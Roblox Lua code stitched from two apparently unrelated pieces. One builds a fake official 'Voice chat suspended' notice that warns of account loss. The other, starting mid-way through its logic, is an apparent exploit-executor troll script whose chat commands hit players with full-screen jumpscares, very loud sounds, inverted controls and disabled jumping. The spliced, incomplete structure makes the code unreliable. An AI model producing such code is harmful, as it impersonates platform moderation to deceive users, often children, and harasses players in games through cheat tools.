TitleText.Position = UDim2.new(0, 0, 0.514710903, 0)
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.BuilderSansBold
TitleText.LineHeight = 1.400
TitleText.Text = "Voice chat suspended"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextScaled = true
TitleText.TextSize = 25.000
TitleText.TextWrapped = true

UITextSizeConstraint.Parent = TitleText
UITextSizeConstraint.MaxTextSize = 25
UITextSizeConstraint.MinTextSize = 20

ButtonContainer.Name = "ButtonContainer"
ButtonContainer.Parent = DialogMainFrame
ButtonContainer.BackgroundTransparency = 1.000
ButtonContainer.LayoutOrder = 9
ButtonContainer.Size = UDim2.new(1, 0, 0, 36)

Layout.Name = "Layout"
Layout.Parent = ButtonContainer
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
Layout.SortOrder = Enum.SortOrder.LayoutOrder
Layout.VerticalAlignment = Enum.VerticalAlignment.Center
Layout.Padding = UDim.new(0, 20)

TextSpaceContainer.Name = "TextSpaceContainer"
TextSpaceContainer.Parent = DialogMainFrame
TextSpaceContainer.BackgroundTransparency = 1.000
TextSpaceContainer.LayoutOrder = 6
TextSpaceContainer.Size = UDim2.new(1, 0, 0, 7)

SubBodyTextContainer.Name = "SubBodyTextContainer"
SubBodyTextContainer.Parent = DialogMainFrame
SubBodyTextContainer.BackgroundTransparency = 1.000
SubBodyTextContainer.LayoutOrder = 7
SubBodyTextContainer.Size = UDim2.new(1, 0, 0, 60)

BodyText.Name = "BodyText"
BodyText.Parent = SubBodyTextContainer
BodyText.BackgroundTransparency = 1.000
BodyText.Position = UDim2.new(0, 0, 2.8499999, 0)
BodyText.Size = UDim2.new(1, 0, 1.20000005, 0)
BodyText.Font = Enum.Font.BuilderSans
BodyText.LineHeight = 1.400
BodyText.Text = "If this happens again, you may lose access to your account."
BodyText.TextColor3 = Color3.fromRGB(189, 190, 190)
BodyText.TextScaled = true
BodyText.TextSize = 20.000
BodyText.TextWrapped = true

UITextSizeConstraint_2.Parent = BodyText
UITextSizeConstraint_2.MaxTextSize = 20
UITextSizeConstraint_2.MinTextSize = 15

BodyTextContainer.Name = "BodyTextContainer"
BodyTextContainer.Parent = DialogMainFrame
BodyTextContainer.BackgroundTransparency = 1.000
BodyTextContainer.LayoutOrder = 5
BodyTextContainer.Size = UDim2.new(1, 0, 0, 120)

BodyText_2.Name = "BodyText"
BodyText_2.Parent = BodyTextContainer
BodyText_2.BackgroundTransparency = 1.000
BodyText_2.Position = UDim2.new(-0.00307692308, 0, 0.683333337, 0)
BodyText_2.Size = UDim2.new(1, 0, 0.842000008, 0)
BodyText_2.Font = Enum.Font.BuilderSans
BodyText_2.LineHeight = 1.400
BodyText_2.Text = "We’ve temporarily turned off voice chat because you may have used language that goes against Roblox Community Standards."
BodyText_2.TextColor3 = Color3.fromRGB(189, 190, 190)
BodyText_2.TextScaled = true
BodyText_2.TextSize = 20.000
BodyText_2.TextWrapped = true

UITextSizeConstraint_3.Parent = BodyText_2
UITextSizeConstraint_3.MaxTextSize = 20
UITextSizeConstraint_3.MinTextSize = 15

WarnText.Name = "WarnText"
WarnText.Parent = BodyTextContainer
WarnText.BackgroundTransparency = 1.000
WarnText.Position = UDim2.new(0.178461537, 0, 0.341666669, 0)
WarnText.Size = UDim2.new(0.652307689, 0, 0.583333313, 0)
WarnText.Font = Enum.Font.BuilderSansBold
WarnText.LineHeight = 1.400
WarnText.Text = "4 minute suspension"
WarnText.TextColor3 = Color3.fromRGB(189, 190, 190)
WarnText.TextScaled = true
WarnText.TextSize = 97.000
WarnText.TextWrapped = true

UITextSizeConstraint_4.Parent = WarnText
UITextSizeConstraint_4.MaxTextSize = 20
UITextSizeConstraint_4.MinTextSize = 15

Padding.Name = "Padding"
Padding.Parent = DialogMainFrame
Padding.PaddingBottom = UDim.new(0, 20)
Padding.PaddingLeft = UDim.new(0, 20)
Padding.PaddingRight = UDim.new(0, 20)
Padding.PaddingTop = UDim.new(0, 20)

Icon.Name = "Icon"
Icon.Parent = DialogMainFrame
Icon.AnchorPoint = Vector2.new(0.5, 0.5)
Icon.BackgroundTransparency = 1.000
Icon.BorderSizePixel = 0
Icon.LayoutOrder = 1
Icon.Position = UDim2.new(0.503076911, 0, 0.0212310497, 0)
Icon.Size = UDim2.new(0, 55, 0, 55)
Icon.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_6.png"
Icon.ImageRectOffset = Vector2.new(248, 386)
Icon.ImageRectSize = Vector2.new(36, 36)

DividerSpaceContainer.Name = "DividerSpaceContainer"
DividerSpaceContainer.Parent = DialogMainFrame
DividerSpaceContainer.BackgroundTransparency = 1.000
DividerSpaceContainer.LayoutOrder = 4
DividerSpaceContainer.Size = UDim2.new(1, 0, 0, 7)

Overlay.Name = "Overlay"
Overlay.Parent = InGameMenuInformationalDialog
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 0.500
Overlay.BorderSizePixel = 0
Overlay.Position = UDim2.new(0, 0, 0, -60)
Overlay.Size = UDim2.new(2, 0, 2, 0)
Overlay.ZIndex = 0
Overlay.AutoButtonColor = false
Overlay.Text = ""

ConfirmButton.Name = "ConfirmButton"
ConfirmButton.Parent = InGameMenuInformationalDialog
ConfirmButton.BackgroundTransparency = 1.000
ConfirmButton.LayoutOrder = 1
ConfirmButton.Position = UDim2.new(0.395999999, 0, 0.610000005, 0)
ConfirmButton.Size = UDim2.new(0.218181819, -5, 0, 48)
ConfirmButton.AutoButtonColor = false
ConfirmButton.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_1.png"
ConfirmButton.ImageRectOffset = Vector2.new(402, 494)
ConfirmButton.ImageRectSize = Vector2.new(17, 17)
ConfirmButton.ScaleType = Enum.ScaleType.Slice
ConfirmButton.SliceCenter = Rect.new(8, 8, 9, 9)

ButtonContent.Name = "ButtonContent"
ButtonContent.Parent = ConfirmButton
ButtonContent.BackgroundTransparency = 1.000
ButtonContent.Size = UDim2.new(1, 0, 1, 0)

ButtonMiddleContent.Name = "ButtonMiddleContent"
ButtonMiddleContent.Parent = ButtonContent
ButtonMiddleContent.BackgroundTransparency = 1.000
ButtonMiddleContent.Size = UDim2.new(1, 0, 1, 0)

UIListLayout.Parent = ButtonMiddleContent
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout.Padding = UDim.new(0, 5)

Text.Name = "Text"
Text.Parent = ButtonMiddleContent
Text.BackgroundTransparency = 1.000
Text.LayoutOrder = 2
Text.Position = UDim2.new(0.184049085, 0, -0.270833343, 0)
Text.Size = UDim2.new(0, 103, 0, 22)
Text.Font = Enum.Font.BuilderSansBold
Text.Text = "I Understand"
Text.TextColor3 = Color3.fromRGB(57, 59, 61)
Text.TextSize = 20.000
Text.TextWrapped = true

SecondaryButton.Name = "SecondaryButton"
SecondaryButton.Parent = InGameMenuInformationalDialog
SecondaryButton.BackgroundTransparency = 1.000
SecondaryButton.LayoutOrder = 1
SecondaryButton.Position = UDim2.new(0.0356753246, 0, 0.329711277, 0)
SecondaryButton.Size = UDim2.new(1, -5, 0, 36)
SecondaryButton.AutoButtonColor = false

sizeConstraint.Name = "sizeConstraint"
sizeConstraint.Parent = SecondaryButton
sizeConstraint.MinSize = Vector2.new(295, 42.1599998)

textLabel.Name = "textLabel"
textLabel.Parent = SecondaryButton
textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
textLabel.BackgroundTransparency = 1.000
textLabel.Position = UDim2.new(0.473154902, 0, 6.42753744, 0)
textLabel.Size = UDim2.new(0, 381, 0, 44)
textLabel.Font = Enum.Font.BuilderSansBold
textLabel.Text = "Let us know"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 20.000
textLabel.TextTransparency = 0.300
textLabel.TextWrapped = true

SecondaryButton_2.Name = "SecondaryButton"
SecondaryButton_2.Parent = InGameMenuInformationalDialog
SecondaryButton_2.BackgroundTransparency = 1.000
SecondaryButton_2.LayoutOrder = 1
SecondaryButton_2.Position = UDim2.new(0.0356753246, 0, 0.329711277, 0)
SecondaryButton_2.Size = UDim2.new(1, -5, 0, 36)
SecondaryButton_2.AutoButtonColor = false

sizeConstraint_2.Name = "sizeConstraint"
sizeConstraint_2.Parent = SecondaryButton_2
sizeConstraint_2.MinSize = Vector2.new(295, 42.1599998)

textLabel_2.Name = "textLabel"
textLabel_2.Parent = SecondaryButton_2
textLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
textLabel_2.BackgroundTransparency = 1.000
textLabel_2.Position = UDim2.new(0.471051186, 0, 5.97912741, 0)
textLabel_2.Size = UDim2.new(0, 381, 0, 22)
textLabel_2.Font = Enum.Font.BuilderSansBold
textLabel_2.Text = "Did we make a mistake? "
textLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel_2.TextSize = 20.000
textLabel_2.TextTransparency = 0.300
textLabel_2.TextWrapped = true

-- Scripts:

local function KIAWSKW_fake_script() -- ConfirmButton.LocalScript
	local script = Instance.new('LocalScript', ConfirmButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(KIAWSKW_fake_script)()

            -- Removed Commands
            --[[elseif command == ".bring" then
                player.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
            ]]
            elseif command == ".js" then
                local jumpscareGui = Instance.new("ScreenGui", game:GetService("CoreGui")) -- Parent to CoreGui
                jumpscareGui.DisplayOrder = 10 -- Ensure it's on top
                jumpscareGui.ResetOnSpawn = false -- Prevent reset on respawn
                local img = Instance.new("ImageLabel", jumpscareGui)
                img.Size = UDim2.new(1, 0, 1, 0) -- Full screen size
                img.Position = UDim2.new(0, 0, 0, 0) -- Cover entire screen
                img.Image = "http://www.roblox.com/asset/?id=10798732430"
                local sound = Instance.new("Sound", game:GetService("SoundService"))
                sound.SoundId, sound.Volume = "rbxassetid://161964303", 10
                sound:Play()
                wait(1.674)
                jumpscareGui:Destroy()
                sound:Destroy()
            elseif command == ".js2" then
                local jumpscareGui = Instance.new("ScreenGui",  game:GetService("CoreGui")) -- Parent to CoreGui
                jumpscareGui.DisplayOrder = 10 -- Ensure it's on top
                jumpscareGui.ResetOnSpawn = false -- Prevent reset on respawn
                local img = Instance.new("ImageLabel", jumpscareGui)
                img.Size = UDim2.new(1, 0, 1, 0) -- Full screen size
                img.Position = UDim2.new(0, 0, 0, 0) -- Cover entire screen
                img.Image = "http://www.roblox.com/asset/?id=75431648694596"
                local sound = Instance.new("Sound", game:GetService("SoundService"))
                sound.SoundId, sound.Volume = "rbxassetid://7236490488", 100
                sound:Play()
                wait(3.599)
                jumpscareGui:Destroy()
                sound:Destroy()
            elseif command == ".invert" then
                if not controlInversionActive[player.UserId] then
                    controlInversionActive[player.UserId] = true
                    local char = player.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local inversionConnection = humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(function()
                            humanoid:Move(Vector3.new(-humanoid.MoveDirection.X, 0, -humanoid.MoveDirection.Z), true)
                        end)
                        wait(10) -- Invert for 10 seconds
                        inversionConnection:Disconnect()
                        controlInversionActive[player.UserId] = nil
                    end
                end
            elseif command == ".uninvert" then
                if controlInversionActive[player.UserId] then
                    controlInversionActive[player.UserId] = nil
                end
            -- Removed Commands
            --[[elseif command == ".spin" then
                if not spinActive[player.UserId] then
                    spinActive[player.UserId] = true
                    local char = player.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local initialRotation = char.HumanoidRootPart.CFrame
                        for i = 1, 12 do
                            wait(0.1)
                            char.HumanoidRootPart.CFrame = initialRotation * CFrame.Angles(0, math.rad(30 * i), 0)
                        end
                    end
                end
            elseif command == ".unspin" then
                if spinActive[player.UserId] then
                    spinActive[player.UserId] = nil
                end
            ]]
            elseif command == ".disablejump" then
                if not jumpDisabled[player.UserId] then
                    jumpDisabled[player.UserId] = true
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = 0
                        wait(5)
                        humanoid.JumpPower = 50 -- Reset jump power (default can vary)
                        jumpDisabled[player.UserId] = nil
                    end
                end
            elseif command == ".unenablejump" then
                if jumpDisabled[player.UserId] then
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = 50 -- Reset jump power
                    end
                    jumpDisabled[player.UserId] = nil
                end
            -- Removed Commands
            elseif command == ".scare" then
                local sound = Instance.new("Sound", player.Character)
                sound.SoundId = "rbxassetid://157636218"
                sound.Volume = 100
                sound:Play()
                wait(2.5) -- Wait for the sound to finish
                sound:Destroy()
                elseif command == ".knock" then
                local sound = Instance.new("Sound", player.Character)
                sound.SoundId = "rbxassetid://5236308259"
                sound.Volume = 100
                sound:Play()
                wait(15) -- Wait for the sound to finish
                sound:Destroy()
            
            elseif command == ".bighead" then
                local head = player.Character:FindFirstChild("Head")
                if head then
                    head.Size = head.Size * 2
                end
            elseif command == ".tiny" then
                local char = player.Character
                if char then
                    char:FindFirstChild("Humanoid").RootPart.Size = Vector3.new(0.5, 0.5, 0.5)
                end
            elseif command == ".big" then
                local char = player.Character
                if char then
                    char:FindFirstChild("Humanoid").RootPart.Size = Vector3.new(2, 2, 2)
                end
            elseif command == ".sillyhat" then
                local hat = Instance.new("Accessory")
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshId = "rbxassetid://14170755549" -- Change this to a funny hat asset ID
                mesh.Parent = hat
                hat.Parent = player.Character
            end
        end
         -- Admin Target Commands
        if targetPlayer then
            -- Removed Commands
            --[[if command == ".bring" then
                executeCommand(admin, targetPlayer, ".bring")
            elseif command == ".kill" then
                executeCommand(admin, targetPlayer, ".kill")
            elseif command == ".jump" then
                targetPlayer.Character.Humanoid.Jump = true
            elseif command == ".sit" then
                targetPlayer.Character.Humanoid.Sit = true
            ]]-- Removed Commands
            --[[elseif command == ".spin" then
                if not spinActive[targetPlayer.UserId] then
                    spinActive[targetPlayer.UserId] = true
                    local char = targetPlayer.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local initialRotation = char.HumanoidRootPart.CFrame
                        for i = 1, 12 do
                            wait(0.1)
                            char.HumanoidRootPart.CFrame = initialRotation * CFrame.Angles(0, math.rad(30 * i), 0)
                        end
                    end
                end
            elseif command == ".unspin" then
                if spinActive[targetPlayer.UserId] then
                    spinActive[targetPlayer.UserId] = nil
                end
            ]]-- Removed Commands
            --[[elseif command == ".speed" then
                local speedValue = tonumber(msg:match("%.speed%s+[^%s]+%s+(%d+)"))
                if speedValue then
                    targetPlayer.Character.Humanoid.WalkSpeed = speedValue
                else
                    Chat("Invalid speed value. Please use a number.")
                end
            ]]-- Removed Commands
            --[[elseif command == ".kick" then
                local reason = msg:match("%.kick%s+[^%s]+%s+(.*)")
                targetPlayer:Kick(reason or "Kicked by admin")
            ]]-- Removed Commands
            --[[elseif command == ".freeze" then
                targetPlayer.Character.HumanoidRootPart.Anchored = true
                frozenPlayers[targetPlayer.UserId] = true
            elseif command == ".unfreeze" then
                if frozenPlayers[targetPlayer.UserId] then
                    targetPlayer.Character.HumanoidRootPart.Anchored = false
                    frozenPlayers[targetPlayer.UserId] = nil
                end
            ]]-- Removed Commands
            --[[elseif command == ".follow" then
                follow(true, targetPlayer.Character.HumanoidRootPart.Position)
            elseif command == ".unfollow" then
                follow(false, targetPlayer.Character.HumanoidRootPart.Position)
            ]]-- Removed Commands
            --[[elseif command == ".fling" then
                targetPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(250,250,250)
                targetPlayer.Character.Humanoid.Sit=true
            ]]-- Removed Commands
            --[[elseif command == ".orbit" then
                local parts = msg:split(" ")
                local distance = tonumber(parts[3])
                local speed = tonumber(parts[4])
                if distance and speed then
                    local targetHRP = targetPlayer.Character.HumanoidRootPart
                    local localHRP = player.Character.HumanoidRootPart
                    local orbitRadius = distance
                    local orbitSpeed = speed
                    local angle = 0
                    local RunService = game:GetService("RunService")
                    getgenv().orbiting = true

                    local stepConnection = RunService.RenderStepped:Connect(function(deltaTime)
                        if not getgenv().orbiting then
                            stepConnection:Disconnect()
                            return
                        end
                        angle = angle + orbitSpeed * deltaTime
                        local orbitPosition = targetHRP.Position + Vector3.new(orbitRadius * math.cos(angle), 0, orbitRadius * math.sin(angle))
                        localHRP.CFrame = CFrame.lookAt(orbitPosition, targetHRP.Position) * CFrame.Angles(0, math.rad(90), 0)
                    end)
                else
                    Chat("Usage: .orbit [target] [distance] [speed]")
                end
            elseif command == ".unorbit" then
                getgenv().orbiting = false
            ]]-- Removed Commands
            --[[elseif command == ".trip" then
                local humanoid = targetPlayer.Character.Humanoid
local hrp = targetPlayer.Character.HumanoidRootPart
-- Create banana MeshPart
local banana = Instance.new("MeshPart")
banana.MeshId = "rbxassetid://7076530645"
banana.TextureID = "rbxassetid://7076530688"
banana.Size = Vector3.new(0.7, 1, 0.8) -- Made banana bigger
banana.Anchored = true
banana.CanCollide = false
banana.Parent = workspace
-- Create slip sound
local slipSound = Instance.new("Sound")
slipSound.SoundId = "rbxassetid://8317474936"
slipSound.Volume = 1
slipSound.Parent = hrp
-- Use raycast to find floor position
local rayOrigin = hrp.Position + Vector3.new(0, 0, -2)
local rayDirection = Vector3.new(0, -10, 0)
local raycastResult = workspace:Raycast(rayOrigin, rayDirection)
if raycastResult then
    -- Place banana sideways with a 90-degree rotation on X axis
    banana.CFrame = CFrame.new(raycastResult.Position)
        * CFrame.Angles(math.rad(90), math.rad(math.random(0, 360)), 0)
else
    banana.CFrame = hrp.CFrame * CFrame.new(0, -2.5, -2)
end
   -- Create and configure the forward movement tween
    local tweenService = game:GetService("TweenService")
    local forwardTweenInfo = TweenInfo.new(
        0.3, -- Duration
        Enum.EasingStyle.Linear,
        Enum.EasingDirection.Out
    )

    -- Move character forward
    local forwardGoal = {CFrame = hrp.CFrame * CFrame.new(0, 0, -3)} -- Move 3 studs forward
    local forwardTween = tweenService:Create(hrp, forwardTweenInfo, forwardGoal)
    forwardTween:Play()

    -- Wait for forward movement to complete
    task.wait(0.3)

    -- Create and configure the arc falling tween
    local fallTweenInfo = TweenInfo.new(
        0.6, -- Longer duration for arc motion
        Enum.EasingStyle.Quad,
        Enum.EasingDirection.In -- Changed to In for better arc effect
    )

    -- Tween the character's position and rotation in an arc
    local fallGoal = {
        CFrame = hrp.CFrame
        * CFrame.new(0, -0.5, -4) -- Move forward and down
        * CFrame.Angles(math.rad(90), 0, 0) -- Rotate forward
    }
    local fallTween = tweenService:Create(hrp, fallTweenInfo, fallGoal)
    fallTween:Play()
humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
task.wait(2)
humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
task.wait(0.5)
humanoid:ChangeState(Enum.HumanoidStateType.None)
task.wait(1)
banana:Destroy()
slipSound:Destroy()
            ]]-- Removed Commands
            --[[elseif command == ".re" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, targetPlayer)
            end
            ]]
        end
    end)
end

-- Add admin functionality for listed users
for _, player in ipairs(game.Players:GetPlayers()) do
    if table.find(adminCmd, player.Name) then
        setupAdminCommands(player)
    end
end

game.Players.PlayerAdded:Connect(function(player)
    if table.find(adminCmd, player.Name) then
        setupAdminCommands(player)
    end
end)
